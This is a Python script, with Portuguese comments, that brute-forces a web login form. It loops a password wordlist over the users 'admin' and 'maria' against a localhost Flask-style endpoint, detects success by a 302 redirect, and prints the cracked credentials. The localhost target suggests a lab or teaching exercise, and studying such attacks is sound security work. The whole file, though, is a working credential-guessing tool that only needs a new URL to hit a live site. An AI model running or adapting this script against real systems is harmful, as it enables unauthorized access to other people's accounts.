import sys
import requests

URL = "http://127.0.0.1:5000/login"
WORDLIST = "wordlist.txt"

# Usuarios que vamos tentar quebrar
ALVOS = ["admin", "maria"]


def carregar_wordlist(caminho):
    try:
        with open(caminho, "r", encoding="utf-8", errors="ignore") as f:
            # remove linhas vazias e espacos
            return [linha.strip() for linha in f if linha.strip()]
    except FileNotFoundError:
        print(f"[erro] Wordlist '{caminho}' nao encontrada.")
        sys.exit(1)


def tentar_login(usuario, senha):
    """Retorna True se o login tiver sucesso."""
    # Sessao propria para nao reaproveitar cookies entre tentativas
    s = requests.Session()
    resp = s.post(
        URL,
        data={"username": usuario, "senha": senha},
        allow_redirects=False,  # login OK responde com redirect (302)
    )
    # Login invalido -> renderiza a pagina de novo (200 com "invalidos")
    # Login valido   -> redireciona (302) para /admin ou /aluno
    if resp.status_code == 302:
        destino = resp.headers.get("Location", "")
        return True, destino
    return False, None


def main():
    senhas = carregar_wordlist(WORDLIST)
    print(f"[info] {len(senhas)} senhas carregadas de '{WORDLIST}'")
    print(f"[info] Alvo: {URL}\n")

    encontradas = {}

    for usuario in ALVOS:
        print(f"==> Tentando usuario '{usuario}'...")
        for i, senha in enumerate(senhas, 1):
            sucesso, destino = tentar_login(usuario, senha)
            print(f"    [{i:>3}/{len(senhas)}] {usuario}:{senha}", end="")
            if sucesso:
                print("  <<< SENHA ENCONTRADA!")
                encontradas[usuario] = senha
                print(f"    -> redirecionado para: {destino}\n")
                break
            print("  (falhou)")
        else:
            print(f"    Nenhuma senha da lista funcionou para '{usuario}'.\n")

    print("=" * 45)
    print("RESULTADO FINAL")
    print("=" * 45)
    if encontradas:
        for usuario, senha in encontradas.items():
            print(f"  [+] {usuario}  ->  {senha}")
    else:
        print("  Nenhuma credencial quebrada.")


if __name__ == "__main__":
    main()